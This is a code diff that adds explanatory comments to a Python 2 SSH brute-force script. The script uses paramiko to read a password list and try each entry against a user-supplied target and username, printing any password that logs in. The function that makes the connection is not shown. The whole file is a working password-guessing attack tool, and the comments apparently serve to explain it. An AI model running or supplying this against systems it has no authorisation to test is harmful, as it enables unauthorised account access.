@@ -1,8 +1,8 @@
-import paramiko, sys
+import paramiko, sys #Paramiko is for SSH, sys returns the integers needed
 target = ''
 username = ''
 passList = ''
-lineBreak = "\n ----------------------------------------------------------------\n"
+lineBreak = "\n ----------------------------------------------------------------\n" #Used to make things look pretty
 
 try: #User inputs data here
 	target = raw_input("* Enter Target Address: ")
@@ -30,19 +30,19 @@ passList = open(passList)
 
 print ""
 
-for i in passList.readLines():
+for i in passList.readLines(): #Goes through every option on the password list and attempts a connection
 	password = i.strip("\n")
 	try:
 		result = ssh_connect(password)
 
 		if result == 0:
 			print("%s* Username: %s * Password: %s%s" % (lineBreak, username, password, lineBreak))
-			sys.exit(0)
+			sys.exit(0) #Prints out a successful password
 		elif result == 1:
 			print("* Username: %s * Password: %s !! Invalid Credentials !!" % (username, password))
 		elif result == 2:
 			print("!! Connection Cannot Be Established !!")
-			sys.exit(2)
+			sys.exit(2) 
 	except Exception, e:
 		print e
 		pass
